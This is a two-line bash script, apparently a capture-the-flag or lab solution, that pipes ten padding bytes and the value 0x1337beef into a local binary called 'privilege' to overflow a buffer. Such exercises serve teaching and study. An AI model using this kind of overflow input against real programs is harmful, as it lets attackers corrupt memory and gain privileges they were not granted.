#!/bin/bash
python -c "print('A' * 10 + '\xef\xbe\x37\x13')" | ./privilege
